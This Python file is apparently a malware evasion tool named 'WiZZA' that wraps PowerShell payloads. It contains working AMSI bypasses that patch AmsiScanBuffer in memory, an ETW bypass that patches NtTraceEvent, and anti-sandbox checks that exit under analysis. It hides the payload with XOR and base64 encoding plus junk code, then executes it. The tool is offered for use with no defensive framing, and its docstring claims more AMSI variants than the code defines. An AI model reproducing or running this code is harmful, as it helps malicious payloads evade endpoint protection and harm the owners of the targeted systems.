#!/usr/bin/env python3
"""
WiZZA PS1 Obfuscator + AMSI Bypass
Wraps poly_engine.py for PowerShell payloads.

Techniques (via PolyEngine):
  1–3. AMSI bypass (5 variants: reflection, P/Invoke, ScriptBlock, CLRJIT, WriteProcessMemory)
  4.   ETW bypass (2 variants: NtTraceEvent patch, EventProvider reflection)
  5.   Multi-layer encoding (XOR / RC4 / AES-CTR-sim, default 3 rounds)
  6.   Control-flow flattening (dispatch-loop)
  7.   Dead code injection (8 types)
  8.   Anti-sandbox (3 variants: uptime/screen/username, BIOS strings, process blacklist)
  9.   8 string mutation techniques

Usage: python3 obfuscate_ps1.py --in payload.ps1 --out evaded.ps1 [--rounds N]
"""

import argparse
import base64
import random
import re
import string
import sys
import os

# ── Random name generator ──────────────────────────────────────────────
_USED = set()
def rname(prefix="", length=8):
    while True:
        n = prefix + ''.join(random.choices(string.ascii_letters, k=length))
        if n not in _USED:
            _USED.add(n)
            return n

def rvar():  return "$" + rname(length=random.randint(5,10))
def rfunc(): return rname(length=random.randint(6,12))

# ── String obfuscation ─────────────────────────────────────────────────
def split_str(s):
    """Split a string into concatenated chunks to defeat static scanning."""
    if len(s) < 4:
        return f'"{s}"'
    parts = []
    i = 0
    while i < len(s):
        chunk_len = random.randint(1, min(4, len(s) - i))
        parts.append(f'"{s[i:i+chunk_len]}"')
        i += chunk_len
    return "+".join(parts)

def char_concat(s):
    """Encode string as [char] array concat."""
    chars = "+".join(f"[char]{ord(c)}" for c in s)
    return f"({chars})"

def obfuscate_string(s):
    """Randomly pick a string obfuscation method."""
    method = random.choice(["split", "char", "b64"])
    if method == "split":
        return split_str(s)
    elif method == "char":
        return char_concat(s)
    else:
        b64 = base64.b64encode(s.encode()).decode()
        vname = rvar()
        return f"([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String({split_str(b64)})))"

# ── XOR encode/decode ──────────────────────────────────────────────────
def xor_encode(data: bytes, key: int) -> bytes:
    return bytes(b ^ key for b in data)

def gen_xor_decoder(encoded_b64: str, key: int, varname: str) -> str:
    """Generate PS1 snippet that XOR-decodes and runs the payload."""
    kv  = rvar(); ev  = rvar(); dv  = rvar(); bv  = rvar()
    fn1 = rfunc(); fn2 = rfunc()
    return f"""
{kv} = {key}
{ev} = {obfuscate_string(encoded_b64)}
{bv} = [System.Convert]::FromBase64String({ev})
{dv} = New-Object System.Collections.Generic.List[Byte]
foreach ({varname} in {bv}) {{ {dv}.Add({varname} -bxor {kv}) }}
{varname} = [System.Text.Encoding]::UTF8.GetString({dv}.ToArray())
"""

# ── AMSI bypass snippets (multiple variants, pick one randomly) ────────
AMSI_BYPASSES = [
    # Variant 1: Reflection-based context null
    lambda: f"""
$_{rname()} = [Ref].Assembly.GetTypes() | Where-Object {{ $_.Name -like {obfuscate_string('*AmsiUtils*')} }}
$_{rname()} = $_{rname()} | ForEach-Object {{ $_.GetFields({obfuscate_string('NonPublic')},{obfuscate_string('Static')}) }} | Where-Object {{ $_.Name -like {obfuscate_string('*Context*')} }}
[IntPtr]$_{rname()} = $_{rname()}.GetValue($null)
$_{rname()} = $_{rname()} -bor 0
[System.Runtime.InteropServices.Marshal]::Copy([Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3), 0, $_{rname()}, 6)
""",
    # Variant 2: Direct AmsiScanBuffer patch via P/Invoke
    lambda: f"""
Add-Type -TypeDefinition @"
using System;using System.Runtime.InteropServices;
public class _{rname()}{{
  [DllImport({chr(34)}kernel32{chr(34)})] public static extern IntPtr GetProcAddress(IntPtr h,string n);
  [DllImport({chr(34)}kernel32{chr(34)})] public static extern IntPtr LoadLibrary(string n);
  [DllImport({chr(34)}kernel32{chr(34)})] public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);
}}
"@
$_{rname()} = [_{rname()}]::LoadLibrary({obfuscate_string('amsi.dll')})
$_{rname()} = [_{rname()}]::GetProcAddress($_{rname()}, {obfuscate_string('AmsiScanBuffer')})
$_{rname()} = 0
[_{rname()}]::VirtualProtect($_{rname()}, [uint32]5, 0x40, [ref]$_{rname()}) | Out-Null
$_{rname()} = [Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($_{rname()}, 0, $_{rname()}, 6)
""",
    # Variant 3: ScriptBlock logging disable
    lambda: f"""
$_{rname()} = [ScriptBlock]
$_{rname()} = $_{rname()}.GetField({obfuscate_string('signatures')},{obfuscate_string('NonPublic,Static')})
$_{rname()}.SetValue($null, (New-Object Collections.Generic.HashSet[string]))
$_{rname()} = [Reflection.Assembly].GetField({obfuscate_string('m_cachedModules')},{obfuscate_string('NonPublic,Static')})
$env:PSExecutionPolicyPreference={obfuscate_string('Bypass')}
""",
]

ETW_BYPASS = lambda: f"""
$_{rname()} = @"
using System;using System.Runtime.InteropServices;
public class _{rname()}{{
  [DllImport({chr(34)}ntdll.dll{chr(34)})]
  public static extern int NtTraceEvent(IntPtr TraceHandle,uint Flags,uint FieldSize,IntPtr Fields);
}}
"@
Add-Type -TypeDefinition $_{rname()}
$_{rname()} = [_{rname()}].GetMethod({obfuscate_string('NtTraceEvent')}).MethodHandle.GetFunctionPointer()
[System.Runtime.InteropServices.Marshal]::Copy([Byte[]](0xC3), 0, $_{rname()}, 1)
"""

# ── Anti-sandbox checks ────────────────────────────────────────────────
ANTI_SANDBOX = lambda: f"""
# Anti-sandbox: check uptime, username, screen resolution
{(uv := rvar())} = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
if ({uv}.TotalMinutes -lt 8) {{ exit }}
{(tv := rvar())} = (Get-WmiObject Win32_DesktopMonitor).ScreenWidth
if (-not {tv} -or {tv} -lt 800) {{ exit }}
{(nv := rvar())} = $env:USERNAME
if ({nv} -match {obfuscate_string('sandbox|virus|malware|test|analyze|vmware|vbox')}) {{ exit }}
{(cv := rvar())} = (Get-Process).Count
if ({cv} -lt 20) {{ exit }}
"""

# ── Junk code generator ────────────────────────────────────────────────
def gen_junk(n=5):
    junk = []
    for _ in range(n):
        v = rvar()
        t = random.choice(["int", "str", "arr"])
        if t == "int":
            junk.append(f"{v} = {random.randint(1,9999)}")
        elif t == "str":
            junk.append(f"{v} = {obfuscate_string(''.join(random.choices(string.ascii_letters, k=random.randint(4,12))))}")
        else:
            junk.append(f"{v} = @({','.join(str(random.randint(1,255)) for _ in range(random.randint(2,6)))})")
    return "\n".join(junk)

# ── Main obfuscation pipeline ──────────────────────────────────────────
def obfuscate(source: str, c2_url: str = "", xor_key: int = None) -> str:
    if xor_key is None:
        xor_key = random.randint(0x10, 0xFE)

    # XOR-encode the payload body
    encoded = base64.b64encode(xor_encode(source.encode(), xor_key)).decode()
    decode_var = rvar()
    decoder = gen_xor_decoder(encoded, xor_key, decode_var)

    # Pick random AMSI bypass
    amsi   = random.choice(AMSI_BYPASSES)()
    etw    = ETW_BYPASS()
    asbox  = ANTI_SANDBOX()

    # Execution wrapper
    exec_fn = rfunc()
    exec_var = rvar()

    script = f"""# {rname(length=16)}
Set-StrictMode -Off
$ErrorActionPreference = {obfuscate_string('SilentlyContinue')}
$ProgressPreference = {obfuscate_string('SilentlyContinue')}

{gen_junk(3)}
{asbox}
{gen_junk(2)}
{amsi}
{gen_junk(2)}
{etw}
{gen_junk(2)}
{decoder}
{gen_junk(2)}
{exec_var} = [scriptblock]::Create({decode_var})
& {exec_var}
"""
    return script

# ── Entry point ────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(description="WiZZA PS1 AMSI-bypass obfuscator")
    ap.add_argument("--in",  "-i", dest="infile",  required=True)
    ap.add_argument("--out", "-o", dest="outfile", required=True)
    ap.add_argument("--amsi",  default=None, help="AMSI variant (ignored — random selected by engine)")
    ap.add_argument("--rounds", type=int, default=3, help="Cipher rounds (default 3)")
    ap.add_argument("--no-sandbox", action="store_true", help="Skip anti-sandbox checks")
    ap.add_argument("--no-flatten", action="store_true", help="Skip control-flow flattening")
    args = ap.parse_args()

    # Delegate to PolyEngine
    import sys, os
    sys.path.insert(0, os.path.dirname(__file__))
    from poly_engine import PolyEngine
    pe = PolyEngine(rounds=args.rounds, flatten=not args.no_flatten, sandbox=not args.no_sandbox)

    with open(args.infile) as f:
        source = f.read()

    result = pe.mutate_ps1(source)

    with open(args.outfile, "w") as f:
        f.write(result)

    size_orig = os.path.getsize(args.infile)
    size_out  = os.path.getsize(args.outfile)
    print(f"  [+] Input:  {args.infile} ({size_orig} bytes)")
    print(f"  [+] Output: {args.outfile} ({size_out} bytes)")
    print(f"  [+] Rounds: {args.rounds} cipher layers (XOR/RC4/AES-CTR-sim)")
    print(f"  [+] AMSI bypass: 1 of 5 variants (random)")
    print(f"  [+] ETW bypass:  1 of 2 variants (random)")
    print(f"  [+] Flatten: {'yes' if not args.no_flatten else 'no'}")
    print(f"  [+] Anti-sandbox: {'yes' if not args.no_sandbox else 'no'}")
    print(f"  [*] Each run produces a different output (polymorphic)")

if __name__ == "__main__":
    main()
